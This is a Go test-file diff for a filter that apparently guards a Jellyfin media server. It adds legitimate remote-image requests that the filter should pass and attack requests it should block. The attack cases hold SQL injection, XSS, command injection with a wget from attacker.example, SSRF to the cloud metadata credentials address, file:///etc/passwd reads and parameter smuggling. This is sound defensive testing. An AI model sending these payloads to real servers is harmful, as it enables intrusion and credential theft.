@@ -97,6 +97,25 @@ var jfNames = []string{"Watch the Tide", "Top Floor Kings", "Sleep Tight, Harbou
 	"Head Over Hills", "Last Train to Wexmoor", "Time Bandit Island", "Echo Valley", "Sudo Sisters", "Netcat Records",
 	"Who Framed the Moon?"}
 
+// jfImages are pictures metadata providers offer for an item, as the server
+// lists them: the provider's name, with spaces in some, and the picture's
+// address in that provider's shape, on a made-up host. A studio's picture is
+// at an address with the studio's name in it as it is.
+var jfImages = []struct{ provider, url string }{
+	{"TheMovieDb", "https://image.example.org/t/p/original/7xdcg2lMLzgeonyLGcTJFiz4soC.jpg"},
+	{"TheTVDB", "https://artworks.example.com/banners/v4/season/2048193/posters/ce50211670eae.jpg"},
+	{"TheTVDB", "https://artworks.example.com/banners/fanart/original/81273-12.jpg"},
+	{"The Open Movie Database", "https://m.media.example.com/images/M/MV5BZGI1YjVmYWItOGY0ZC00ZTI3LTlkYTEtNDk0YzczY2YyNTZkXkEyXkFqcGc@._V1_SX300.jpg"},
+	{"Fanart", "https://assets.example.net/fanart/tv/90210/tvposter/lanternfall-the-long-night-of-the-paper-harbour-ferry-5f1a2b3c4d5e6.jpg"},
+	{"TheAudioDB", "https://r2.example.com/images/media/album/thumb/qvxrtw1592810364.jpg"},
+	{"Artwork Repository", "https://art.example.org/studios/images/Kestrel & Finch Pictures (UK)/thumb.jpg"},
+	{"Artwork Repository", "https://art.example.org/studios/images/Harbour+/logo.jpg"},
+	{"Artwork Repository", "https://art.example.org/studios/images/Cinéma du Port!/thumb.jpg"},
+	{"Cover Art Archive", "https://coverart.example.org/release/84e55160-3200-44ea-97a9-4ded97491e23/829521842.jpg"},
+	{"AniList", "https://s4.example.net/file/anilistcdn/media/anime/cover/large/bx21-CXtrrkMpJ8Zq.png"},
+	{"Kitsu", "https://media.example.org/anime/poster_images/1/original.jpg?1597604210"},
+}
+
 // password is one a password manager made.
 func (g jf) password() string {
 	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{};:'\",.<>/?`~|\\"
@@ -181,8 +200,11 @@ func (g jf) rokuProfile(name, model string) map[string]any {
 	}
 }
 
-// uriComponent is s as encodeURIComponent writes it, a space as %20.
-func uriComponent(s string) string { return strings.ReplaceAll(url.QueryEscape(s), "+", "%20") }
+// uriComponent is s as encodeURIComponent writes it: a space as %20, and
+// !'()* as they are.
+func uriComponent(s string) string { return uriComponentMarks.Replace(url.QueryEscape(s)) }
+
+var uriComponentMarks = strings.NewReplacer("+", "%20", "%21", "!", "%27", "'", "%28", "(", "%29", ")", "%2A", "*")
 
 func (g jf) progress(c jfClient) map[string]any {
 	item := g.id()
@@ -401,6 +423,20 @@ func TestTheJellyfinSetLetsItsClientsThrough(t *testing.T) {
 					}
 				}
 			}
+			for _, img := range jfImages {
+				item, c, provider := g.id(), g.client(g.r.IntN(jfClients)), uriComponent(img.provider)
+				for _, r := range []jfRequest{
+					{"GET", "/Items/" + item + "/RemoteImages?type=Primary&startIndex=0&limit=30&IncludeAllLanguages=false&ProviderName=" + provider, "", "", false, c},
+					{"POST", "/Items/" + item + "/RemoteImages/Download?Type=" + g.pick("Primary", "Backdrop", "Logo", "Thumb") +
+						"&ImageUrl=" + uriComponent(img.url) + "&ProviderName=" + provider, "", "", false, c},
+					{"POST", "/Items/RemoteSearch/Apply/" + item + "?ReplaceAllImages=true", "application/json", vwJSON(map[string]any{"Name": "Lanternfall",
+						"ProviderIds": map[string]any{"Tmdb": "84512"}, "ProductionYear": 2019, "ImageUrl": img.url, "SearchProviderName": img.provider}), false, c},
+				} {
+					if status := jfSend(t, plain, r); status != http.StatusOK {
+						t.Errorf("%s %s %s (%s): %d", r.method, r.path, r.body, r.client.userAgent, status)
+					}
+				}
+			}
 			for i := range 2 * jfClients {
 				for _, r := range g.requests(g.client(i % jfClients)) {
 					if status := jfSend(t, plain, r); status != http.StatusOK {
@@ -450,6 +486,11 @@ func TestTheJellyfinSetKeepsTheAttacks(t *testing.T) {
 		{"POST", "/Users/AuthenticateByName", js, vwJSON(map[string]any{"Username": "admin' OR 1=1--", "Pw": "x"}), false, c},
 		{"POST", "/Sessions/Capabilities/Full", js, device("FriendlyName", "<script>alert(1)</script>"), false, roku},
 		{"POST", "/Items/" + g.id() + "/PlaybackInfo", js, device("ModelDescription", "Type: TV; cat /etc/passwd"), false, roku},
+		{"POST", "/Items/" + g.id() + "/RemoteImages/Download?Type=Primary&ImageUrl=" +
+			uriComponent("http://169.254.169.254/latest/meta-data/iam/security-credentials/") + "&ProviderName=TheMovieDb", "", "", false, c},
+		{"POST", "/Items/" + g.id() + "/RemoteImages/Download?Type=Primary&ImageUrl=" +
+			uriComponent("https://image.example.org/t/p/original/x.jpg' UNION SELECT Password FROM Users--"), "", "", false, c},
+		{"GET", "/Items/" + g.id() + "/RemoteImages?type=Primary&ProviderName=" + uriComponent("<script>alert(1)</script>"), "", "", false, c},
 	}
 	attacks := []jfRequest{
 		{"GET", "/Items?userId=" + g.id() + "&fields=" + url.QueryEscape("Overview' OR '1'='1") + "&recursive=true", "", "", false, c},
@@ -459,6 +500,15 @@ func TestTheJellyfinSetKeepsTheAttacks(t *testing.T) {
 		{"POST", "/Sessions/Playing/Progress", js, progress("ItemId", "1; wget http://attacker.example/x.sh"), false, c},
 		{"POST", "/Sessions/Playing/Progress", js, progress("PlaySessionId", "<img src=x onerror=alert(1)>"), false, c},
 		{"POST", "/Items/RemoteSearch/Apply/" + g.id(), js, vwJSON(map[string]any{"Name": "x", "ImageUrl": "file:///etc/passwd"}), false, c},
+		// The check for links off the site skips only a picture's one web
+		// address, on a host with a name, where a picture is taken.
+		{"POST", "/Items/" + g.id() + "/RemoteImages/Download?Type=Primary&ImageUrl=" + uriComponent("ftp://attacker.example/x.jpg"), "", "", false, c},
+		{"POST", "/Items/" + g.id() + "/RemoteImages/Download?Type=Primary&ImageUrl=" + uriComponent("http://intranet/x.jpg"), "", "", false, c},
+		{"POST", "/Items/" + g.id() + "/RemoteImages/Download?Type=Primary&ImageUrl=" + uriComponent("https://image.example.org/t/p/original/x.jpg") +
+			"&ImageUrl=" + uriComponent("http://attacker.example/x.txt"), "", "", false, c},
+		{"POST", "/Items/RemoteSearch/Apply/" + g.id(), js, vwJSON(map[string]any{"Name": "x", "ImageUrl": "https://image.example.org/t/p/original/x.jpg",
+			"imageUrl": "http://attacker.example/x.txt"}), false, c},
+		{"POST", "/Items/" + g.id() + "/Refresh?ImageUrl=" + uriComponent("https://attacker.example/x.txt"), "", "", false, c},
 		{"GET", "/System/Info", "", "", false, jfClient{c.userAgent,
 			`MediaBrowser Client="Jellyfin Web", Device="<script>alert(1)</script>", DeviceId="x", Version="1", Token="` + g.id() + `"`, c.deviceID, true, false, "", false}},
 		// A command after the client's name. After a closing bracket only
